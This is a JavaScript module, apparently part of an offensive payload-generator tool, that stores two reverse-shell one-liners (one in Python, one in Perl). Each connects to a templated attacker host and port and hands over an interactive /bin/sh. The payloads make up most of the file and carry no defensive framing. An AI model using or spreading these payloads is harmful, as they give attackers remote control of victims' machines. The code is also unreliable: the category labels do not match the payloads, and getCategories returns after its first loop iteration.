var prompt = require('prompt');
// Payload Array
arrayTools = []

// title, description, payload, category, and callback (optional: used for additional options if needed)
$1={
	title: "Tools", 
	description: "A reverse shell one liner written in python",
	payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$$LHOST$$\",$$LPORT$$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
	category: "sqlmap",
	callback: function(returnToPrepare){
		prompt.message = "Press any key to return :"
		prompt.get([{name: 'printConfigMEnu', description: ':'}], function(){
			returnToPrepare()
		})
	}
}

$2={
	title: "Tools",
	description: "A reverse shell one liner written in perl",
	payload: "perl -e 'use Socket;$i=\"$$LHOST$$\";$p=$$LPORT$$;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
	category: "Nmap",
	callback: ""
}



arrayTools.push($1,$2)

var unique = []
var uniqueCategories = []

module.exports = {
	values: arrayTools,
	getAll: function(value){
		tempArray = []
		for(i=0;i<arrayTools.length;i++){
			if (arrayTools[i].category === value){
				tempArray.push(arrayTools[i])
			}
		}
		return tempArray
	},
	getCategories: function(){
		for (i=0;i<arrayTools.length;i++){
			if(unique[arrayTools[i].category]){

			}
			else {
				unique[arrayTools[i].category] = true;
				uniqueCategories.push(arrayTools[i].category)
			} 
		return uniqueCategories
		}
	}
}